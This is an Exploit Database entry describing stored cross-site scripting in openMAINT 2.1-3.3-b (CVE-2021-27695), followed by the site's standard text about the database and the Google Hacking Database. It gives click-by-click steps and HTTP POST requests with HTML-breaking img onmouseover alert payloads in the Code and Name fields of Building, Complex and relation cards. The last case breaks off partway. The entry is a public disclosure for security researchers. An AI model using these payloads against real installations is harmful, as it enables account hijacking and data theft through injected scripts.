# Exploit Title: openMAINT openMAINT 2.1-3.3-b - 'Multiple' Persistent Cross-Site Scripting
# Date: 13/03/2021
# Exploit Author: Hosein Vita
# Vendor Homepage: https://www.openmaint.org/
# Software Link: https://sourceforge.net/projects/openmaint/files/2.1/Core%20updates/openmaint-2.1-3.3.1/
# Version: 2.1-3.3
# Tested on: Linux
# CVE: CVE-2021-27695

Summary:

Multiple stored cross-site scripting (XSS) vulnerabilities in openMAINT 2.1-3.3-b allow remote attackers to inject arbitrary web script or HTML via any "Add" sections, such as Add Card Building & Floor, or others in the Name And Code Parameters.

Proof of concepts :

1-Login to you'r Dashboard As a low privilege user
2-Click On Facilities and assets - Location - Sites
3- +Add card Building
4- Code and name parameters both are vulnerable

POST /openmaint/services/rest/v3/classes/Building/cards?_dc=1615626728539 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

.....
Cookie: ...

{"_type":"Building","_tenant":"","Code":"\"><img src=code onmouseover=alert(1)>","Description":null,"Name":"\"><img src=name onmouseover=alert(1)>",....}

The Xss will  trigger in that form, and also if you click on "Map" button , the xss will trigger there

------------------------------------------------------------------------
Another Xss :

1-Like above in Facilities click on Locations and click on complex
2-click + Add card Complex
3-insert javascript payload to Code And Name

POST /openmaint/services/rest/v3/classes/Complex/cards?_dc=1615627279082 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

{"_type":"Complex","_tenant":"","Code":"\"><img src=complex onmouseover=alert(1)>","Description":null,"Name":"\"><img src=complex onmouseover=alert(1)>",...}

4-Save it
5-Back to Sites and click on previous card
6- in position section click on "Complex" drop down
7- xss will trigger

------------------------------------------------------------------------
Another Xss:

1-Like exmaples above go to Locations and click on Sites
2-Add Card Building or click  the one you created before
3-in left menu click on "Relations"
4-click "Add relations" and select one of the options
5- Add Card and select one of the options
6- insert javascript payload to code and name parameter

{"_type":"","_tenant":"","Code":"\"><img src=add relation onmouseover=alert(3)>","Name":"\"><img src=add relation onmouseover=alert(3)>","Description":null,..... }

7- save it and close the form
8-click on the card and there an option which is "Open Relation Graph" click on it and click on card list
9- xss payload will trigger

------------------------------------------------------

Another Xss:

1- In "Navigation" Bar click on "Configurations"
2- Click on parameter
3- + Add card Parameter

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
